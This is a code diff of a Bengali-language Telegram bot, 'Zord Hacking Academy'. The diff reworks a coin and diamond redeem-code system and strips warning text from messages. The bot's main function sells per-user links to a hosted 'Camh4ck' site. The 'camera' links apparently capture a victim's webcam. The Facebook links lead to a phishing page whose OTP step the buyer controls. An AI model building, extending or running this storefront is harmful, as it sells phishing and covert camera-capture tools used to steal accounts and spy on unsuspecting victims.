@@ -19,7 +19,7 @@ BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 user_commands = {} 
-temp_admin_data = {} # অ্যাডমিন ইনপুট সাময়িকভাবে রাখার জন্য
+temp_admin_data = {} # অ্যাডমিন ইনপুটের জন্য
 
 # --- রেন্ডার ও CORS সার্ভার ---
 app = Flask('')
@@ -38,7 +38,7 @@ def get_command(user_id):
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
 def keep_alive(): Thread(target=run).start()
 
-# --- ডাটাবেস ফাংশনসমূহ ---
+# --- ডেটাবেস ফাংশন ---
 def get_user(user_id):
     res = requests.get(f"{FIREBASE_URL}/users/{user_id}.json")
     return res.json() or {"coins": 0, "diamonds": 0, "referral_count": 0, "status": "active"}
@@ -68,48 +68,46 @@ def welcome(message):
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("চ্যানেলে জয়েন করুন 📢", url=f"https://t.me/hackingacademyX"))
         markup.add(types.InlineKeyboardButton("জয়েন করেছি ✅", callback_data="verify_join"))
-        bot.send_message(user_id, "⚠️ **অ্যাক্সেস ডিনাইড!**\nচ্যানেলে জয়েন না করলে বোট সচল হবে না।", reply_markup=markup)
+        bot.send_message(user_id, "⚠️ **অ্যাক্সেস ডিনাইড!**\nবোটটি ব্যবহার করতে আগে চ্যানেলে জয়েন করুন।", reply_markup=markup)
         return
-    bot.send_message(user_id, "📡 **সিস্টেম অনলাইন...**\nZord Hacking Academy কনসোলে স্বাগতম।", reply_markup=main_menu())
-
-# --- অ্যাডমিন প্যানেল শুরু ---
-@bot.message_handler(commands=['admin'])
-def admin_start(message):
-    if message.chat.id == ADMIN_ID:
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("🪙 Coin Code", callback_data="admin_set_coin"),
-                   types.InlineKeyboardButton("💎 Diamond Code", callback_data="admin_set_dia"))
-        bot.send_message(ADMIN_ID, "🛠 **রিডিম কোড জেনারেটর**\nপ্রথমে সিলেক্ট করুন আপনি কিসের কোড বানাবেন:", reply_markup=markup)
-    else:
-        bot.send_message(message.chat.id, "❌ আপনি অ্যাডমিন নন!")
+    bot.send_message(user_id, "📡 **সিস্টেম অনলাইন...**\nZord Hacking Academy-তে স্বাগতম।", reply_markup=main_menu())
 
 # --- টেক্সট মেসেজ ও মেনু লজিক ---
 @bot.message_handler(func=lambda m: True)
 def handle_text(message):
     user_id = str(message.chat.id)
     if not is_subscribed(user_id): return
-    
+
     text = message.text
     data = get_user(user_id)
 
     if text == "🚀 Start":
-        bot.send_message(user_id, "🚀 সিস্টেম রেডি।", reply_markup=main_menu())
+        bot.send_message(user_id, "🚀 কমান্ড গ্রহণ করার জন্য বোটটি প্রস্তুত।", reply_markup=main_menu())
+
     elif text == "💰 My Assets":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🛒 প্রিমিয়াম পারচেজ", url=f"https://t.me/{ADMIN_USERNAME}"),
                    types.InlineKeyboardButton("🎁 রিডিম কোড দিন", callback_data="redeem_ui"))
-        bot.send_message(user_id, f"📊 **ব্যালেন্স স্ট্যাটাস:**\n\n🪙 Coins: `{data.get('coins', 0)}` \n💎 Diamonds: `{data.get('diamonds', 0)}`", reply_markup=markup, parse_mode='Markdown')
+        
+        # শুধুমাত্র অ্যাডমিনের জন্য জেনারেট বাটন
+        if message.chat.id == ADMIN_ID:
+            markup.add(types.InlineKeyboardButton("⚙️ Generate Redeem Code", callback_data="admin_gen_start"))
+            
+        bot.send_message(user_id, f"📊 **অ্যাকাউন্ট স্ট্যাটাস:**\n\n🪙 Coins: `{data.get('coins', 0)}` \n💎 Diamonds: `{data.get('diamonds', 0)}`", reply_markup=markup, parse_mode='Markdown')
+
     elif text == "👥 Refer":
-        bot_username = bot.get_me().username
-        link = f"https://t.me/{bot_username}?start={user_id}"
-        bot.send_message(user_id, f"👥 **রেফারাল লিঙ্ক:**\n`{link}`\nপ্রতি রেফারে ৫০ কয়েন।")
+        bot_user = bot.get_me().username
+        link = f"https://t.me/{bot_user}?start={user_id}"
+        bot.send_message(user_id, f"👥 **রেফারাল প্রোগ্রাম:**\n\nলিঙ্ক: `{link}`", parse_mode='Markdown')
+
     elif text == "🔥 Access":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📸 ক্যামেরা (10 Coin)", callback_data="buy_cam"),
                    types.InlineKeyboardButton("🔐 ফেসবুক (5 Diamond)", callback_data="buy_fb"))
-        bot.send_message(user_id, "🛠 **টুলস সিলেক্ট করুন:**", reply_markup=markup)
+        bot.send_message(user_id, "🛠 **টুলস মেনু:**", reply_markup=markup)
+
     elif text == "ℹ️ Info":
-        bot.send_message(user_id, "🏛 **Zord Hacking Academy**\n━━━━━━━━━━━━━━━━━━━━\n⚠️ সতর্কবার্তা: অপব্যবহারের জন্য ব্যবহারকারী দায়ী।", parse_mode='Markdown')
+        bot.send_message(user_id, "🏛 **Zord Hacking Academy**\n━━━━━━━━━━━━━━━━━━━━\n⚠️ সতর্কবার্তা: অপব্যবহারের জন্য ব্যবহারকারী দায়ী।")
 
 # --- কলব্যাক হ্যান্ডলার ---
 @bot.callback_query_handler(func=lambda call: True)
@@ -117,23 +115,31 @@ def callback_handler(call):
     user_id = str(call.message.chat.id)
     data = get_user(user_id)
 
-    # অ্যাডমিন ফ্লো: টাইপ সিলেক্ট
-    if call.data.startswith("admin_set_"):
-        asset_type = "coins" if "coin" in call.data else "diamonds"
-        temp_admin_data[ADMIN_ID] = {"type": asset_type}
-        msg = bot.send_message(ADMIN_ID, f"✅ আপনি **{asset_type}** সিলেক্ট করেছেন।\n\nএখন লিখুন কোডটি কত {asset_type}-এর হবে? (শুধু সংখ্যা লিখুন):")
-        bot.register_next_step_handler(msg, admin_get_amount)
+    # অ্যাডমিন রিডিম কোড জেনারেশন ফ্লো
+    if call.data == "admin_gen_start":
+        if int(user_id) != ADMIN_ID: return
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🪙 Coins", callback_data="set_type_coins"),
+                   types.InlineKeyboardButton("💎 Diamonds", callback_data="set_type_diamonds"))
+        bot.send_message(ADMIN_ID, "🛠 **জেনারেটর:**\nকোডটি কিসের জন্য বানাবেন?", reply_markup=markup)
+
+    elif call.data.startswith("set_type_"):
+        ctype = call.data.split("_")[2]
+        temp_admin_data[ADMIN_ID] = {"type": ctype}
+        msg = bot.send_message(ADMIN_ID, f"✅ {ctype} সিলেক্ট করেছেন।\nকত অ্যামাউন্ট দিতে চান? (শুধু সংখ্যা লিখুন):")
+        bot.register_next_step_handler(msg, admin_amount_step)
 
     elif call.data == "redeem_ui":
         msg = bot.send_message(user_id, "📩 আপনার রিডিম কোডটি এখানে লিখুন:")
-        bot.register_next_step_handler(msg, process_redeem)
+        bot.register_next_step_handler(msg, process_redeem_user)
 
+    # বাকি সব অরিজিনাল লজিক (ক্যামেরা, ফেসবুক, ওটিপি) ঠিক রাখা হয়েছে
     elif call.data == "buy_cam":
         if data.get('coins', 0) >= 10:
             data['coins'] -= 10
             save_user(user_id, data)
             link = f"{BASE_URL}?id={user_id}&exp={int(time.time())+3600}"
-            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: `{link}`\n\n⚠️ সতর্কবার্তা: লিঙ্কের অপব্যবহারের জন্য আপনি দায়ী।")
+            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: `{link}`")
         else: bot.answer_callback_query(call.id, "❌ যথেষ্ট কয়েন নেই!", show_alert=True)
 
     elif call.data == "buy_fb":
@@ -142,7 +148,7 @@ def callback_handler(call):
             save_user(user_id, data)
             user_commands[user_id] = "loading"
             link = f"{BASE_URL}fb/?id={user_id}&exp={int(time.time())+3600}"
-            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: `{link}`\n\n⚠️ সতর্কবার্তা: ওটিপি পেজ কন্ট্রোল করতে পারবেন।")
+            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: `{link}`")
         else: bot.answer_callback_query(call.id, "❌ ডায়মন্ড নেই!", show_alert=True)
 
     elif call.data.startswith("open_otp_"):
@@ -153,76 +159,60 @@ def callback_handler(call):
     elif call.data == "verify_join":
         if is_subscribed(user_id):
             bot.delete_message(user_id, call.message.message_id)
-            bot.send_message(user_id, "✅ অ্যাকাউন্ট সচল হয়েছে।", reply_markup=main_menu())
+            bot.send_message(user_id, "✅ ভেরিফিকেশন সফল!", reply_markup=main_menu())
         else: bot.answer_callback_query(call.id, "❌ আগে জয়েন করুন!", show_alert=True)
 
-# --- অ্যাডমিন রিডিম কোড প্রসেস ---
-def admin_get_amount(message):
+# --- অ্যাডমিন প্রসেস ফাংশন ---
+def admin_amount_step(message):
     if not message.text.isdigit():
-        msg = bot.send_message(ADMIN_ID, "❌ ভুল ইনপুট! দয়া করে শুধু সংখ্যা লিখুন (কত অ্যামাউন্ট):")
-        bot.register_next_step_handler(msg, admin_get_amount)
+        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন:")
+        bot.register_next_step_handler(msg, admin_amount_step)
         return
     temp_admin_data[ADMIN_ID]["amount"] = int(message.text)
-    msg = bot.send_message(ADMIN_ID, "✅ অ্যামাউন্ট সেট করা হয়েছে।\n\nএখন লিখুন কোডটি **কতজন** ইউজার ব্যবহার করতে পারবে? (সংখ্যা দিন):")
-    bot.register_next_step_handler(msg, admin_get_limit)
+    msg = bot.send_message(ADMIN_ID, "✅ এখন লিখুন কতজন ইউজার এটি ব্যবহার করতে পারবে? (সংখ্যা দিন):")
+    bot.register_next_step_handler(msg, admin_limit_step)
 
-def admin_get_limit(message):
+def admin_limit_step(message):
     if not message.text.isdigit():
-        msg = bot.send_message(ADMIN_ID, "❌ ভুল ইনপুট! দয়া করে শুধু সংখ্যা লিখুন (কতজন ইউজার):")
-        bot.register_next_step_handler(msg, admin_get_limit)
+        msg = bot.send_message(ADMIN_ID, "❌ শুধু সংখ্যা লিখুন:")
+        bot.register_next_step_handler(msg, admin_limit_step)
         return
     
     limit = int(message.text)
-    asset_type = temp_admin_data[ADMIN_ID]["type"]
+    atype = temp_admin_data[ADMIN_ID]["type"]
     amount = temp_admin_data[ADMIN_ID]["amount"]
-    
-    # র‍্যান্ডম কোড জেনারেশন
     code = "ZORD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
     
-    # ফায়ারবেসে সেভ করা
-    promo_data = {
-        "type": asset_type,
-        "amount": amount,
-        "limit": limit,
-        "used_count": 0,
-        "used_by": {}
-    }
+    promo_data = {"type": atype, "amount": amount, "limit": limit, "used_count": 0, "used_by": {}}
     requests.put(f"{FIREBASE_URL}/promo_codes/{code}.json", json=promo_data)
     
-    bot.send_message(ADMIN_ID, f"🎉 **সফলভাবে রিডিম কোড তৈরি হয়েছে!**\n\n🎫 কোড: `{code}`\n💰 কিসের জন্য: {asset_type}\n💵 পরিমাণ: {amount}\n👥 ব্যবহারকারী সীমা: {limit} জন", parse_mode='Markdown')
+    bot.send_message(ADMIN_ID, f"🎉 **কোড তৈরি হয়েছে!**\n\n🎫 কোড: `{code}`\n💰 কিসের জন্য: {atype}\n💵 পরিমাণ: {amount}\n👥 সীমা: {limit} জন", parse_mode='Markdown')
 
-# --- ইউজার রিডিম কোড প্রসেসিং ---
-def process_redeem(message):
+# --- ইউজার রিডিম প্রসেস ---
+def process_redeem_user(message):
     user_id = str(message.chat.id)
-    code_input = message.text.strip()
-    
-    # ফায়ারবেস থেকে কোড চেক
-    res = requests.get(f"{FIREBASE_URL}/promo_codes/{code_input}.json")
-    promo = res.json()
+    code_in = message.text.strip()
+    res = requests.get(f"{FIREBASE_URL}/promo_codes/{code_in}.json").json()
 
-    if promo:
-        used_by = promo.get("used_by", {})
-        if user_id in used_by:
-            bot.send_message(user_id, "❌ আপনি ইতিমধ্যে এই কোডটি ব্যবহার করেছেন!")
+    if res:
+        if user_id in res.get("used_by", {}):
+            bot.send_message(user_id, "❌ আপনি এটি একবার ব্যবহার করেছেন!")
+            return
+        if res["used_count"] >= res["limit"]:
+            bot.send_message(user_id, "❌ এই কোডের ব্যবহারের সীমা শেষ!")
             return
         
-        if promo["used_count"] >= promo["limit"]:
-            bot.send_message(user_id, "❌ এই কোডটির ব্যবহারের সীমা শেষ হয়ে গেছে!")
-            return
+        udata = get_user(user_id)
+        udata[res["type"]] += res["amount"]
+        save_user(user_id, udata)
         
-        # ব্যালেন্স আপডেট
-        user_data = get_user(user_id)
-        user_data[promo["type"]] += promo["amount"]
-        save_user(user_id, user_data)
+        res["used_count"] += 1
+        if "used_by" not in res: res["used_by"] = {}
+        res["used_by"][user_id] = True
+        requests.put(f"{FIREBASE_URL}/promo_codes/{code_in}.json", json=res)
         
-        # কোড স্ট্যাটাস আপডেট
-        promo["used_count"] += 1
-        promo["used_by"][user_id] = True
-        requests.put(f"{FIREBASE_URL}/promo_codes/{code_input}.json", json=promo)
-        
-        bot.send_message(user_id, f"🎉 **অভিনন্দন!**\nআপনি সফলভাবে {promo['amount']} {promo['type']} রিডিম করেছেন।")
-    else:
-        bot.send_message(user_id, "❌ ভুল রিডিম কোড!")
+        bot.send_message(user_id, f"🎉 আপনি {res['amount']} {res['type']} পেয়েছেন!")
+    else: bot.send_message(user_id, "❌ ভুল কোড!")
 
 if __name__ == "__main__":
     keep_alive()
